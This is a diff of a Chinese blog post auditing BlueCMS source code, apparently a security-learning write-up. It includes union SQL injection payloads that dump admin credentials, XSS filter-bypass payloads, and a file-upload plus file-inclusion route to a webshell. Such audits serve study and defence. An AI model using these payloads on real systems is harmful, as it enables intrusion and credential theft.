@@ -28,7 +28,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://q4.qlogo.cn/headimg_dl?dst_uin=1444440144&spec=100">
 <meta property="article:published_time" content="2021-08-07T02:13:38.114Z">
-<meta property="article:modified_time" content="2022-03-10T16:45:32.058Z">
+<meta property="article:modified_time" content="2022-04-11T09:03:53.811Z">
 <meta property="article:author" content="ch1e">
 <meta property="article:tag" content="web安全">
 <meta property="article:tag" content="代码审计">
@@ -137,7 +137,7 @@
         <i class="fas fa-history fa-fw post-meta-icon"></i>
         <span class="post-meta-label">
           更新于
-            2022-04-10
+            2022-04-11
         </span>
       </div>
       <div class="post-meta-wordcount">
@@ -154,16 +154,16 @@
   <div class="post-content">
     <h1 id="Bluecms代码审计"><a href="#Bluecms代码审计" class="headerlink" title="Bluecms代码审计"></a>Bluecms代码审计</h1><h2 id="Bluecms代码审计之union联合查询注入"><a href="#Bluecms代码审计之union联合查询注入" class="headerlink" title="Bluecms代码审计之union联合查询注入"></a>Bluecms代码审计之union联合查询注入</h2><p>先把我们的源码下载好，并且搭建好</p>
 <p>打开我们的Seay源代码审计系统，把源码丢进去自动审计一下</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210807101543726.png" alt="image-20210807101543726"></p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411165408578.png" alt="image-20220411165408578"></p>
 <p>我们可以看到这里第一条就是可能存在SQL注入的地方，点进去看看</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210807101810140.png" alt="image-20210807101810140"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210807101934566.png" alt="image-20210807101934566"></p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411165424042.png" alt="image-20220411165424042"></p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411165439374.png" alt="image-20220411165439374"></p>
 <p>我们可以继续跟踪一下这个函数，函数代码如下</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deep_addslashes</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(is_array(<span class="variable">$str</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$str</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$str</span>[<span class="variable">$key</span>] = deep_addslashes(<span class="variable">$val</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$str</span> = addslashes(<span class="variable">$str</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这函数定义的大概意思就是如果传进来的参数是数组，每个过滤一下，如果不是，就直接对传进来的参数先经过一下addslashes这个函数，也就是对某些特殊字符进行转义</p>
 <p>我们继续回到漏洞可能存在的ad_js.php进行分析</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210807102257332.png" alt="image-20210807102257332"></p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411165504129.png" alt="image-20220411165504129"></p>
 <p>这里判断了是否有传入ad_id参数，如果传入了先对他使用一下trim函数，否则为空</p>
 <p>如果不为空，执行如下的语句</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ad</span> = <span class="variable">$db</span>-&gt;getone(<span class="string">&quot;SELECT * FROM &quot;</span>.table(<span class="string">&#x27;ad&#x27;</span>).<span class="string">&quot; WHERE ad_id =&quot;</span>.<span class="variable">$ad_id</span>);</span><br></pre></td></tr></table></figure>
@@ -179,7 +179,7 @@
 
 <p>这个函数的作用就是输出错误信息</p>
 <p>大致的代码分析完了，这里基本上可以说没有过滤</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210807103656567.png" alt="image-20210807103656567"></p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411165522348.png" alt="image-20220411165522348"></p>
 <p>之后就靠这里的echo输出结果，我们知道了这个注入点对他进行注入看看，直接构造payload</p>
 <p>Payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?ad_id=-1 order by 8#  //报错，得知7个列</span><br><span class="line">?ad_id=-1 union select 1,2,3,4,5,6,7 #  //F12查看，发现7是回显位</span><br><span class="line">?ad_id=-1 union select 1,2,3,4,5,6,table_name from information_schema.tables wehre table_schema=database() limit 0,1 #//这里爆数据表名 一个个爆</span><br></pre></td></tr></table></figure>
@@ -191,18 +191,18 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,2,3,4,5,6,concat(admin_name,1,pwd) from blue_admin limit 0,1#</span><br></pre></td></tr></table></figure>
 
 <p>我们这里直接拿1来分隔吧，反正都一样</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210807105035881.png" alt="image-20210807105035881"></p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411165538215.png" alt="image-20220411165538215"></p>
 <h2 id="Bluecms代码审计之存储型XSS"><a href="#Bluecms代码审计之存储型XSS" class="headerlink" title="Bluecms代码审计之存储型XSS"></a>Bluecms代码审计之存储型XSS</h2><h3 id="注入点-1"><a href="#注入点-1" class="headerlink" title="注入点-1"></a>注入点-1</h3><p>我这里直接找的功能点，在Bluecms中有个人资料可以修改，如果过滤不当就可以造成XSS漏洞，我们这里来看看</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210807113539976.png" alt="image-20210807113539976"></p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411165553763.png" alt="image-20220411165553763"></p>
 <p>个人资料在user.php下，我们直接看文件吧</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210807113654255.png" alt="image-20210807113654255"></p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411165612358.png" alt="image-20220411165612358"></p>
 <p>主要代码如下</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$birthday</span> = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;birthday&#x27;</span>]);</span><br><span class="line"><span class="variable">$sex</span> = intval(<span class="variable">$_POST</span>[<span class="string">&#x27;sex&#x27;</span>]);</span><br><span class="line">   <span class="variable">$email</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]) ? trim(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">   <span class="variable">$msn</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;msn&#x27;</span>]) ? trim(<span class="variable">$_POST</span>[<span class="string">&#x27;msn&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">   <span class="variable">$qq</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;qq&#x27;</span>]) ? trim(<span class="variable">$_POST</span>[<span class="string">&#x27;qq&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">   <span class="variable">$mobile_phone</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mobile_phone&#x27;</span>]) ? trim(<span class="variable">$_POST</span>[<span class="string">&#x27;mobile_phone&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">   <span class="variable">$office_phone</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;office_phone&#x27;</span>]) ? trim(<span class="variable">$_POST</span>[<span class="string">&#x27;office_phone&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">   <span class="variable">$home_phone</span>   = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;home_phone&#x27;</span>]) ? trim(<span class="variable">$_POST</span>[<span class="string">&#x27;home_phone&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$address</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;address&#x27;</span>]) ? htmlspecialchars(<span class="variable">$_POST</span>[<span class="string">&#x27;address&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>他这里很明显啊，除了对address有把特殊字符转化为html实体以外，其他都只用了一个trim函数</p>
 <p>所以这里就可以造成一个存储型XSS，因为这里提交的个人资料是存放到数据库里会被再次查询的</p>
 <p>直接插入XSS代码 </p>
-<p><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210807113843645.png" alt="image-20210807113843645"></p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411165631393.png" alt="image-20220411165631393"></p>
 <h3 id="注入点-2"><a href="#注入点-2" class="headerlink" title="注入点-2"></a>注入点-2</h3><p>同样的在user.php下面有个添加新闻   也可能存在XSS漏洞，我们随便看看吧</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="variable">$act</span> == <span class="string">&#x27;do_add_news&#x27;</span>) &#123;</span><br><span class="line"> 	<span class="keyword">include_once</span> <span class="string">&#x27;include/upload.class.php&#x27;</span>;</span><br><span class="line"> 	<span class="variable">$image</span> = <span class="keyword">new</span> upload();</span><br><span class="line"> 	<span class="variable">$title</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]) ? htmlspecialchars(trim(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>])) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> 	<span class="variable">$color</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;color&#x27;</span>]) ? htmlspecialchars(trim(<span class="variable">$_POST</span>[<span class="string">&#x27;color&#x27;</span>])) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> 	<span class="variable">$cid</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cid&#x27;</span>]) ? intval(<span class="variable">$_POST</span>[<span class="string">&#x27;cid&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> 	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$cid</span>))&#123;</span><br><span class="line"> 		showmsg(<span class="string">&#x27;新闻分类不能为空&#x27;</span>);</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	<span class="variable">$author</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;author&#x27;</span>]) ? htmlspecialchars(trim(<span class="variable">$_POST</span>[<span class="string">&#x27;author&#x27;</span>])) : <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_name&#x27;</span>];</span><br><span class="line"> 	<span class="variable">$source</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;source&#x27;</span>]) ? htmlspecialchars(trim(<span class="variable">$_POST</span>[<span class="string">&#x27;source&#x27;</span>])) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$content</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]) ? filter_data(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$descript</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;descript&#x27;</span>]) ? mb_substr(<span class="variable">$_POST</span>[<span class="string">&#x27;descript&#x27;</span>], <span class="number">0</span>, <span class="number">90</span>) : mb_substr(html2text(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]),<span class="number">0</span>, <span class="number">90</span>);</span><br></pre></td></tr></table></figure>
 
@@ -213,16 +213,16 @@
 <p>正则匹配了一些东西，这里很容易绕过</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;1&quot; onerror=alert(1)&gt;</span><br><span class="line">或者大小写绕过</span><br><span class="line">&lt;scir&lt;script&gt;pt&gt; 重写绕过。</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210807122410003.png" alt="image-20210807122410003"></p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411165646575.png" alt="image-20220411165646575"></p>
 <h2 id="Bluecms代码审计之文件上传配合文件包含getshell"><a href="#Bluecms代码审计之文件上传配合文件包含getshell" class="headerlink" title="Bluecms代码审计之文件上传配合文件包含getshell"></a>Bluecms代码审计之文件上传配合文件包含getshell</h2><p>首先要getshell，如果没法直接上传普通的webshell，那就只能找文件包含了</p>
 <p>这里找到一处文件包含位于user.php中</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210807134929583.png" alt="image-20210807134929583"></p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411165659970.png" alt="image-20220411165659970"></p>
 <p>可以看到get请求传入一个act，然后post请求传入一个pay，就会去包含include/payment/‘.$_POST[‘pay’].”/index.php这个文件，这里他的变量处在中间，没办法只能把后面截断了，这里还是和熊海cms那样利用长度限制来截断</p>
 <p>这里随便找个上传点上传个图片马  首先要包含这个文件，需要知道他文件的目录在哪</p>
 <p>所以头像上传是个不错的选择，上传好以后直接F12得到他的位置</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210807135224092.png" alt="image-20210807135224092"></p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411165803886.png" alt="image-20220411165803886"></p>
 <p>接下来直接去利用文件包含即可</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210807135418238.png" alt="image-20210807135418238"></p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411170308015.png" alt="image-20220411170308015"></p>
 <p>这里有post的参数，菜刀肯定是连不上了，我蚁剑貌似也出了点问题</p>
 
   </div>
